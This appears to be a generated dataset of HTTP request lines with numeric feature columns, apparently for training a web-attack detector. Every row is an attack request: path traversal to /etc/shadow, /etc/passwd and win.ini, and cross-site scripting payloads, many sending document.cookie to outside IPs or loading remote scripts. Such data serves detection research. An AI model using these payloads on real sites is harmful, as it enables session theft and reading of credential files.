49,1,200,3125,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,7929,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,5550,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,3807,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
49,1,200,2160,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
46,1,200,2082,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,6736,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,3724,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,1433,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,5441,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,6514,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,2156,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,5042,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,1738,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,2453,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
83,1,200,1857,8,32,16,6,2,GET /?search=<script>%window.open('http://178.129.78.42/239586')3C/script> HTTP/1.1
79,1,200,2031,7,38,14,5,2,GET /?name=<script>window.location.href="http://77.195.91.32"</script> HTTP/1.1
86,1,200,2839,7,33,17,6,2,GET /?search=<script><script+src="http://194.191.196.115/299088.js=></script> HTTP/1.1
99,1,200,3926,7,54,19,6,2,GET /?file=<script>window.location='http://218.76.1.131/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,6488,7,40,14,5,2,GET /?search=<script>window.location.href="http://206.202.97.132"</script> HTTP/1.1
78,1,200,4793,7,28,17,6,2,GET /?p=<script><script+src="http://147.87.26.50/917327.js=></script> HTTP/1.1
83,1,200,4890,7,31,17,6,2,GET /?file=<script><script+src="http://192.223.49.120/236776.js=></script> HTTP/1.1
48,1,200,4733,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1451,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1434,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,4600,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7414,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,4078,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7556,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1833,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7595,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7510,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1570,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1564,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1772,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,4322,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,6665,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,2742,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,4355,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7485,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
101,1,200,3265,7,54,19,6,2,GET /?file=<script>window.location='http://136.22.252.196/?cookie='+document.cookie</script> HTTP/1.1
102,1,200,1231,7,54,19,6,2,GET /?name=<script>window.location='http://229.242.200.235/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,5280,8,30,16,6,2,GET /?name=<script>%window.open('http://209.42.0.226/685426')3C/script> HTTP/1.1
80,1,200,3940,8,30,16,6,2,GET /?name=<script>%window.open('http://188.58.151.0/826336')3C/script> HTTP/1.1
44,1,200,1764,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,6623,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,3924,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,2256,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,7707,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4641,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4954,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,5400,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4626,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,1646,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,1550,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,6536,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
101,1,200,5167,7,54,19,6,2,GET /?file=<script>window.location='http://243.46.146.150/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,5553,7,40,14,5,2,GET /?search=<script>window.location.href="http://56.72.63.191"</script> HTTP/1.1
101,1,200,3025,7,54,19,6,2,GET /?file=<script>window.location='http://164.95.106.110/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,1775,7,31,17,6,2,GET /?file=<script><script+src="http://151.81.106.211/441843.js=></script> HTTP/1.1
83,1,200,3359,7,31,17,6,2,GET /?file=<script><script+src="http://141.40.102.164/736847.js=></script> HTTP/1.1
80,1,200,3956,7,38,14,5,2,GET /?name=<script>window.location.href="http://135.187.23.12"</script> HTTP/1.1
102,1,200,7270,7,54,19,6,2,GET /?name=<script>window.location='http://171.112.127.222/?cookie='+document.cookie</script> HTTP/1.1
103,1,200,3494,7,56,19,6,2,GET /?search=<script>window.location='http://222.41.147.212/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,2127,7,40,14,5,2,GET /?search=<script>window.location.href="http://217.109.181.187"</script> HTTP/1.1
100,1,200,6708,7,54,19,6,2,GET /?file=<script>window.location='http://191.243.99.41/?cookie='+document.cookie</script> HTTP/1.1
57,1,200,6280,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4906,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,7661,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1034,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4042,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,7547,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,5598,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,4203,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,2103,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,5685,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,1618,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6058,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3000,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,6244,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,3715,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,5815,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,5038,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,7224,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
57,1,200,7411,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
103,1,200,1235,7,56,19,6,2,GET /?search=<script>window.location='http://122.18.185.119/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,2176,7,38,14,5,2,GET /?name=<script>window.location.href="http://6.18.71.122"</script> HTTP/1.1
78,1,200,2435,8,27,16,6,2,GET /?p=<script>%window.open('http://62.155.125.23/127171')3C/script> HTTP/1.1
80,1,200,7585,8,30,16,6,2,GET /?file=<script>%window.open('http://5.80.183.152/135249')3C/script> HTTP/1.1
48,1,200,7724,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,2012,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,7802,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,7118,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,5194,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,4851,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,7975,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,3177,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,5404,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,6604,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,2235,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,7031,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,4996,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,6539,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,5271,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,7186,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,1800,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,2090,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,1275,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,6767,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,5330,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,5926,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
104,1,200,1007,7,56,19,6,2,GET /?search=<script>window.location='http://184.128.227.242/?cookie='+document.cookie</script> HTTP/1.1
85,1,200,3096,7,33,17,6,2,GET /?search=<script><script+src="http://56.152.235.203/718075.js=></script> HTTP/1.1
82,1,200,1703,8,30,16,6,2,GET /?name=<script>%window.open('http://198.240.83.159/829406')3C/script> HTTP/1.1
83,1,200,3555,8,30,16,6,2,GET /?name=<script>%window.open('http://120.211.223.123/954451')3C/script> HTTP/1.1
81,1,200,3215,8,30,16,6,2,GET /?name=<script>%window.open('http://100.21.214.93/156632')3C/script> HTTP/1.1
82,1,200,3197,8,30,16,6,2,GET /?file=<script>%window.open('http://227.177.80.232/263489')3C/script> HTTP/1.1
86,1,200,4685,7,33,17,6,2,GET /?search=<script><script+src="http://244.120.182.107/673298.js=></script> HTTP/1.1
82,1,200,7418,7,31,17,6,2,GET /?name=<script><script+src="http://253.97.64.199/802510.js=></script> HTTP/1.1
100,1,200,2924,7,54,19,6,2,GET /?name=<script>window.location='http://222.94.63.253/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,7628,8,32,16,6,2,GET /?search=<script>%window.open('http://166.211.113.48/749767')3C/script> HTTP/1.1
79,1,200,1061,7,35,14,5,2,GET /?p=<script>window.location.href="http://161.230.223.248"</script> HTTP/1.1
82,1,200,6012,8,30,16,6,2,GET /?file=<script>%window.open('http://132.153.30.246/419458')3C/script> HTTP/1.1
82,1,200,1231,7,40,14,5,2,GET /?search=<script>window.location.href="http://72.163.11.114"</script> HTTP/1.1
80,1,200,3426,8,27,16,6,2,GET /?p=<script>%window.open('http://210.177.183.151/657833')3C/script> HTTP/1.1
103,1,200,6498,7,56,19,6,2,GET /?search=<script>window.location='http://206.234.40.117/?cookie='+document.cookie</script> HTTP/1.1
50,1,200,3358,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,4214,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,4385,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2534,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,3367,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,3976,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1996,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7408,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,3780,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,3005,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,6036,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1797,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1221,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2115,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7004,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
77,1,200,5471,7,35,14,5,2,GET /?p=<script>window.location.href="http://19.240.208.64"</script> HTTP/1.1
79,1,200,1189,8,27,16,6,2,GET /?p=<script>%window.open('http://193.30.243.135/400562')3C/script> HTTP/1.1
83,1,200,5723,7,31,17,6,2,GET /?file=<script><script+src="http://154.155.244.202/45295.js=></script> HTTP/1.1
81,1,200,3595,8,30,16,6,2,GET /?name=<script>%window.open('http://216.29.37.176/518135')3C/script> HTTP/1.1
81,1,200,1792,8,30,16,6,2,GET /?file=<script>%window.open('http://24.143.16.188/606229')3C/script> HTTP/1.1
81,1,200,3260,7,40,14,5,2,GET /?search=<script>window.location.href="http://105.99.182.2"</script> HTTP/1.1
77,1,200,5297,7,35,14,5,2,GET /?p=<script>window.location.href="http://157.89.148.20"</script> HTTP/1.1
83,1,200,5905,8,30,16,6,2,GET /?name=<script>%window.open('http://144.160.132.150/572913')3C/script> HTTP/1.1
80,1,200,4123,8,30,16,6,2,GET /?name=<script>%window.open('http://239.16.42.33/779494')3C/script> HTTP/1.1
81,1,200,7268,7,31,17,6,2,GET /?name=<script><script+src="http://140.163.93.84/46235.js=></script> HTTP/1.1
78,1,200,6665,8,27,16,6,2,GET /?p=<script>%window.open('http://41.92.234.213/782427')3C/script> HTTP/1.1
79,1,200,2033,7,35,14,5,2,GET /?p=<script>window.location.href="http://226.209.153.164"</script> HTTP/1.1
83,1,200,1960,7,31,17,6,2,GET /?file=<script><script+src="http://158.242.115.243/21963.js=></script> HTTP/1.1
76,1,200,2535,8,27,16,6,2,GET /?p=<script>%window.open('http://17.43.142.51/95453')3C/script> HTTP/1.1
96,1,200,7482,7,51,19,6,2,GET /?p=<script>window.location='http://69.154.253.3/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,1581,8,30,16,6,2,GET /?name=<script>%window.open('http://155.150.111.111/946856')3C/script> HTTP/1.1
84,1,200,5757,7,33,17,6,2,GET /?search=<script><script+src="http://217.15.66.166/631871.js=></script> HTTP/1.1
98,1,200,6835,7,54,19,6,2,GET /?file=<script>window.location='http://2.143.50.64/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,1995,7,33,17,6,2,GET /?search=<script><script+src="http://173.228.23.81/994028.js=></script> HTTP/1.1
79,1,200,4789,8,27,16,6,2,GET /?p=<script>%window.open('http://254.147.113.52/179359')3C/script> HTTP/1.1
85,1,200,7414,7,33,17,6,2,GET /?search=<script><script+src="http://179.140.206.35/111399.js=></script> HTTP/1.1
97,1,200,6338,7,51,19,6,2,GET /?p=<script>window.location='http://181.20.90.120/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,1721,8,27,16,6,2,GET /?p=<script>%window.open('http://115.21.123.203/20386')3C/script> HTTP/1.1
101,1,200,6076,7,54,19,6,2,GET /?name=<script>window.location='http://255.138.34.153/?cookie='+document.cookie</script> HTTP/1.1
77,1,200,7262,7,35,14,5,2,GET /?p=<script>window.location.href="http://109.254.33.30"</script> HTTP/1.1
84,1,200,5788,7,33,17,6,2,GET /?search=<script><script+src="http://15.79.241.217/945126.js=></script> HTTP/1.1
78,1,200,1733,7,35,14,5,2,GET /?p=<script>window.location.href="http://130.149.100.44"</script> HTTP/1.1
80,1,200,7727,7,31,17,6,2,GET /?file=<script><script+src="http://159.3.21.183/79063.js=></script> HTTP/1.1
98,1,200,5725,7,51,19,6,2,GET /?p=<script>window.location='http://61.197.150.121/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,5289,8,30,16,6,2,GET /?name=<script>%window.open('http://122.245.21.91/798156')3C/script> HTTP/1.1
79,1,200,4165,7,38,14,5,2,GET /?name=<script>window.location.href="http://54.153.6.123"</script> HTTP/1.1
84,1,200,3212,8,32,16,6,2,GET /?search=<script>%window.open('http://162.142.237.226/45282')3C/script> HTTP/1.1
84,1,200,2580,8,32,16,6,2,GET /?search=<script>%window.open('http://121.43.221.200/392243')3C/script> HTTP/1.1
80,1,200,2914,7,28,17,6,2,GET /?p=<script><script+src="http://42.166.253.206/647261.js=></script> HTTP/1.1
82,1,200,4171,7,40,14,5,2,GET /?search=<script>window.location.href="http://23.83.147.109"</script> HTTP/1.1
98,1,200,2524,7,54,19,6,2,GET /?name=<script>window.location='http://19.88.75.52/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,3820,7,31,17,6,2,GET /?file=<script><script+src="http://104.48.107.186/684377.js=></script> HTTP/1.1
97,1,200,2090,7,51,19,6,2,GET /?p=<script>window.location='http://254.104.244.8/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,3563,7,35,14,5,2,GET /?p=<script>window.location.href="http://82.191.191.140"</script> HTTP/1.1
82,1,200,1780,7,40,14,5,2,GET /?search=<script>window.location.href="http://170.155.43.43"</script> HTTP/1.1
80,1,200,4477,7,38,14,5,2,GET /?file=<script>window.location.href="http://29.245.227.42"</script> HTTP/1.1
103,1,200,5210,7,56,19,6,2,GET /?search=<script>window.location='http://45.185.194.244/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,1010,7,54,19,6,2,GET /?file=<script>window.location='http://59.32.152.102/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,3497,7,28,17,6,2,GET /?p=<script><script+src="http://249.29.6.150/984595.js=></script> HTTP/1.1
78,1,200,1253,7,35,14,5,2,GET /?p=<script>window.location.href="http://127.99.204.122"</script> HTTP/1.1
81,1,200,5086,7,40,14,5,2,GET /?search=<script>window.location.href="http://29.68.36.117"</script> HTTP/1.1
98,1,200,4193,7,54,19,6,2,GET /?name=<script>window.location='http://27.0.26.177/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,4330,7,31,17,6,2,GET /?file=<script><script+src="http://28.155.55.227/487700.js=></script> HTTP/1.1
81,1,200,7067,7,40,14,5,2,GET /?search=<script>window.location.href="http://107.30.71.25"</script> HTTP/1.1
82,1,200,3319,7,31,17,6,2,GET /?file=<script><script+src="http://37.173.53.183/523812.js=></script> HTTP/1.1
102,1,200,3068,7,56,19,6,2,GET /?search=<script>window.location='http://231.9.200.120/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,4703,8,30,16,6,2,GET /?name=<script>%window.open('http://58.76.187.188/316548')3C/script> HTTP/1.1
78,1,200,6158,7,35,14,5,2,GET /?p=<script>window.location.href="http://217.208.195.98"</script> HTTP/1.1
85,1,200,5308,7,33,17,6,2,GET /?search=<script><script+src="http://225.57.105.246/327781.js=></script> HTTP/1.1
83,1,200,5256,7,31,17,6,2,GET /?file=<script><script+src="http://129.230.175.178/67754.js=></script> HTTP/1.1
101,1,200,1637,7,54,19,6,2,GET /?file=<script>window.location='http://193.174.89.171/?cookie='+document.cookie</script> HTTP/1.1
85,1,200,2622,7,33,17,6,2,GET /?search=<script><script+src="http://133.210.192.86/431475.js=></script> HTTP/1.1
98,1,200,1702,7,54,19,6,2,GET /?file=<script>window.location='http://66.25.11.33/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,6929,8,30,16,6,2,GET /?name=<script>%window.open('http://184.251.90.137/734592')3C/script> HTTP/1.1
102,1,200,6544,7,54,19,6,2,GET /?file=<script>window.location='http://137.117.204.213/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,2178,7,28,17,6,2,GET /?p=<script><script+src="http://23.159.12.27/667369.js=></script> HTTP/1.1
80,1,200,7410,8,30,16,6,2,GET /?file=<script>%window.open('http://94.173.60.20/458722')3C/script> HTTP/1.1
99,1,200,3399,7,51,19,6,2,GET /?p=<script>window.location='http://155.251.164.236/?cookie='+document.cookie</script> HTTP/1.1
77,1,200,6114,7,35,14,5,2,GET /?p=<script>window.location.href="http://99.44.237.233"</script> HTTP/1.1
100,1,200,5348,7,54,19,6,2,GET /?name=<script>window.location='http://12.233.25.157/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,2764,7,54,19,6,2,GET /?name=<script>window.location='http://184.136.81.207/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,4662,7,33,17,6,2,GET /?search=<script><script+src="http://219.125.70.13/796598.js=></script> HTTP/1.1
77,1,200,4762,8,27,16,6,2,GET /?p=<script>%window.open('http://39.218.233.5/736643')3C/script> HTTP/1.1
99,1,200,7965,7,54,19,6,2,GET /?name=<script>window.location='http://193.140.89.4/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,4680,8,30,16,6,2,GET /?file=<script>%window.open('http://18.0.52.111/693129')3C/script> HTTP/1.1
103,1,200,5569,7,56,19,6,2,GET /?search=<script>window.location='http://252.22.126.123/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,6476,7,51,19,6,2,GET /?p=<script>window.location='http://153.208.150.102/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,5000,7,31,17,6,2,GET /?name=<script><script+src="http://46.185.153.233/907416.js=></script> HTTP/1.1
100,1,200,4416,7,54,19,6,2,GET /?file=<script>window.location='http://61.160.56.207/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,3331,7,54,19,6,2,GET /?file=<script>window.location='http://241.85.160.168/?cookie='+document.cookie</script> HTTP/1.1
77,1,200,5729,8,27,16,6,2,GET /?p=<script>%window.open('http://31.106.10.22/887515')3C/script> HTTP/1.1
81,1,200,7483,7,38,14,5,2,GET /?name=<script>window.location.href="http://174.185.156.34"</script> HTTP/1.1
83,1,200,5124,7,33,17,6,2,GET /?search=<script><script+src="http://12.25.38.112/789001.js=></script> HTTP/1.1
83,1,200,4639,7,31,17,6,2,GET /?file=<script><script+src="http://189.99.223.190/539976.js=></script> HTTP/1.1
83,1,200,1360,7,31,17,6,2,GET /?file=<script><script+src="http://242.38.171.195/470182.js=></script> HTTP/1.1
83,1,200,6602,7,40,14,5,2,GET /?search=<script>window.location.href="http://240.186.75.106"</script> HTTP/1.1
77,1,200,7319,7,35,14,5,2,GET /?p=<script>window.location.href="http://104.79.60.160"</script> HTTP/1.1
82,1,200,2721,8,30,16,6,2,GET /?file=<script>%window.open('http://216.140.123.13/611609')3C/script> HTTP/1.1
83,1,200,2806,8,30,16,6,2,GET /?name=<script>%window.open('http://188.220.131.245/403746')3C/script> HTTP/1.1
81,1,200,1544,7,31,17,6,2,GET /?name=<script><script+src="http://110.196.85.14/98336.js=></script> HTTP/1.1
76,1,200,5719,7,35,14,5,2,GET /?p=<script>window.location.href="http://20.114.94.12"</script> HTTP/1.1
80,1,200,5187,7,28,17,6,2,GET /?p=<script><script+src="http://178.24.127.233/791345.js=></script> HTTP/1.1
82,1,200,1700,7,38,14,5,2,GET /?name=<script>window.location.href="http://122.174.210.249"</script> HTTP/1.1
100,1,200,2152,7,54,19,6,2,GET /?name=<script>window.location='http://127.223.52.11/?cookie='+document.cookie</script> HTTP/1.1
84,1,200,5813,7,31,17,6,2,GET /?name=<script><script+src="http://102.203.167.162/681949.js=></script> HTTP/1.1
80,1,200,6251,7,38,14,5,2,GET /?file=<script>window.location.href="http://156.93.76.217"</script> HTTP/1.1
80,1,200,2963,8,30,16,6,2,GET /?name=<script>%window.open('http://77.63.122.26/416997')3C/script> HTTP/1.1
84,1,200,5391,7,31,17,6,2,GET /?file=<script><script+src="http://113.188.173.180/975145.js=></script> HTTP/1.1
97,1,200,2839,7,51,19,6,2,GET /?p=<script>window.location='http://90.151.178.34/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,7496,7,54,19,6,2,GET /?name=<script>window.location='http://59.123.214.43/?cookie='+document.cookie</script> HTTP/1.1
97,1,200,3233,7,54,19,6,2,GET /?file=<script>window.location='http://73.8.84.71/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,4101,7,54,19,6,2,GET /?name=<script>window.location='http://177.97.1.208/?cookie='+document.cookie</script> HTTP/1.1
103,1,200,2975,7,56,19,6,2,GET /?search=<script>window.location='http://192.176.49.145/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,6749,7,54,19,6,2,GET /?file=<script>window.location='http://54.241.68.112/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,6155,7,28,17,6,2,GET /?p=<script><script+src="http://240.171.166.115/267097.js=></script> HTTP/1.1
80,1,200,2183,7,28,17,6,2,GET /?p=<script><script+src="http://185.32.180.159/156097.js=></script> HTTP/1.1
85,1,200,6427,7,33,17,6,2,GET /?search=<script><script+src="http://148.10.221.224/337466.js=></script> HTTP/1.1
102,1,200,5833,7,54,19,6,2,GET /?name=<script>window.location='http://167.195.185.158/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,7354,8,32,16,6,2,GET /?search=<script>%window.open('http://159.7.152.150/183341')3C/script> HTTP/1.1
80,1,200,4569,8,30,16,6,2,GET /?file=<script>%window.open('http://180.19.28.22/805793')3C/script> HTTP/1.1
77,1,200,5548,7,35,14,5,2,GET /?p=<script>window.location.href="http://120.165.4.157"</script> HTTP/1.1
81,1,200,6072,7,38,14,5,2,GET /?name=<script>window.location.href="http://112.92.248.178"</script> HTTP/1.1
80,1,200,6630,8,27,16,6,2,GET /?p=<script>%window.open('http://186.183.226.237/927977')3C/script> HTTP/1.1
81,1,200,1891,7,38,14,5,2,GET /?name=<script>window.location.href="http://95.217.112.153"</script> HTTP/1.1
82,1,200,3790,7,40,14,5,2,GET /?search=<script>window.location.href="http://60.192.229.35"</script> HTTP/1.1
